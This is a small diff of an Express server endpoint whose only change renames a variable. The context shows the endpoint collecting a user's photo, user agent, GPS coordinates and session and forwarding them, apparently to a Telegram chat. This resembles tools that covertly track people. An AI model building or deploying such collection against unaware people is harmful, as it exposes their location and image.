@@ -76,7 +76,7 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         const userAgent = req.headers["user-agent"]; // User-Agent pengguna
    
 
-        const infos = `
+        const info = `
 - User-Agent: ${userAgent}
 - Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
 - Sesi: ${session}
@@ -87,7 +87,7 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", req.file.buffer, "photo.jpg");
-        formData.append("info", infos);
+        formData.append("info", info);
         formData.append("caption", caption);
         
 
